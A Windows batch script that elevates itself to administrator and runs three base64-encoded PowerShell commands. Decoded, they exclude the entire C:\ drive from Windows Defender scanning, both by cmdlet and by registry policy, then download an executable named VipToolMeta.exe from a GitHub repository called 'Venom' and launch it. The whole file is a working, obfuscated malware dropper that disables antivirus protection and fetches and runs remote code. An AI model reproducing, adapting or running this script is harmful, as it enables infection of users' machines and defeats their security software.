﻿if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)


powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA

powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==

powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8ATAB1AGkAcwBQAGgAYQBuAHQAbwBtAC8AVgBlAG0AbwBtAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAFYAaQBwAFQAbwBvAGwATQBlAHQAYQAuAGUAeABlACIADQAKACQAbwB1AHQAcAB1AHQAIAA9ACAAIgAkAGUAbgB2ADoAVABlAG0AcAAvAFYAaQBwAFQAbwBvAGwATQBlAHQAYQAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA=